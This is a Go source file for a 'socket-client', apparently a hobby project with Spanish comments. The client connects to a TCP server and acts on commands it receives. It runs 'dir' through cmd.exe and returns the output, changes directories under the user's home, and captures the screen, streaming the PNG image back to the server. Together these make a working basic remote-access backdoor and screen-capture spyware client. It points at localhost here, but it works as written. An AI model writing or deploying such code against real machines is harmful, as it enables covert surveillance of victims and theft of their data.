// socket-client project main.go
package main

import (
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/vova616/screenshot"
)

const (
	SERVER_HOST = "localhost"
	SERVER_PORT = "9988"
	SERVER_TYPE = "tcp"
)

func main() {
	//establish connection
	connection, err := net.Dial(SERVER_TYPE, SERVER_HOST+":"+SERVER_PORT)
	if err != nil {
		panic(err)
	}
	///send some data
	_, err = connection.Write([]byte("Hello Server! Greetings."))
	buffer := make([]byte, 1024)
	mLen, err := connection.Read(buffer)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	fmt.Println("Received: ", string(buffer[:mLen]), mLen)

	/* if string(buffer[:mLen]) == "dir" {
		//args := strings.Split("/c dir", " ")
		cmdArgs := []string{"/c", "dir"}
		cmd := exec.Command("cmd.exe", cmdArgs...)
		out, err := cmd.CombinedOutput()
		//cmd.Dir = filepath.Join("C:", "Windows")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		//err := cmd.Run()
		if err != nil {
			fmt.Printf("cmd.Run: %s failed: %s\n", err, err)
		}
		fmt.Printf("la salida de out es", string(out), "fffff")

		_, err = connection.Write([]byte(out))

	}
	fmt.Println("Received: ", string(buffer[:mLen])) */

	/* mLen2, err := connection.Read(buffer)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	fmt.Println("Received: ", string(buffer[:mLen2]))

	if string(buffer[:mLen2]) == "dir" {
		fmt.Println("entre a dir")
		cmdArgs := []string{"/c", "dir"}
		cmd := exec.Command("cmd.exe", cmdArgs...)
		out, err := cmd.CombinedOutput()
		//cmd.Dir = filepath.Join("C:", "Windows")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		//err := cmd.Run()
		if err != nil {
			fmt.Printf("cmd.Run: %s failed: %s\n", err, err)
			_, err = connection.Write([]byte("error al leer el archivo" + err.Error()))
		}
		_, err = connection.Write([]byte(out))
	} */

	for {
		if err != nil {
			panic(err)
		}
		mLen, err := connection.Read(buffer)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
		}
		fmt.Println("Received: ", string(buffer[:mLen]))
		if string(buffer[:mLen]) == "exit" {
			_, err = connection.Write([]byte("cliente cerrado"))
			break
		}
		if string(buffer[:mLen]) == "dir" {
			cmdArgs := []string{"/c", "dir"}
			cmd := exec.Command("cmd.exe", cmdArgs...)
			out, err := cmd.CombinedOutput()
			//cmd.Dir = filepath.Join("C:", "Windows")
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			//err := cmd.Run()
			if err != nil {
				fmt.Printf("cmd.Run: %s failed: %s\n", err, err)
				_, err = connection.Write([]byte("error al leer el archivo" + err.Error()))
			}
			_, err = connection.Write([]byte(out))
		}
		if string(buffer[:2]) == "cd" {
			fmt.Println("el directoria a cambiar es: ", string(buffer[3:mLen]))
			home, _ := os.UserHomeDir()
			err := os.Chdir(filepath.Join(home, string(buffer[3:mLen])))
			//os.Chdir("/Documents")

			if err != nil { // err := os.Chdir(string(buffer[3:mLen]));
				fmt.Println("Error:\tCould not move into the directory (%s)\n")
			}
			newDir, err := os.Getwd()
			if err != nil {
				fmt.Print("error", err)
			}
			_, err = connection.Write([]byte("directorio cambiado: " + newDir))
			fmt.Println("Directorio cambiado a: ", newDir)
		}
		if string(buffer[:mLen]) == "screenshot" {

			img, err := screenshot.CaptureScreen()
			if err != nil {
				panic(err)
			}

			f, err := os.Create("./ss.png")
			if err != nil {
				panic(err)
			}
			err = png.Encode(f, img)
			if err != nil {
				panic(err)
			}
			fi, err := os.Open("./ss.png")
			if err != nil {
				panic(err)
			}
			defer fi.Close()

			_, err = io.Copy(connection, fi)
			if err != nil {
				fmt.Print("error al enviar imagen putoo", err)
			}
			//_, err = connection.Write([]byte())
			f.Close()

			//_, err = connection.Write([]byte("imagen enviada: "))
			fmt.Println("Termine!!")
			connection.Close()

		}
	}
	defer connection.Close()
}
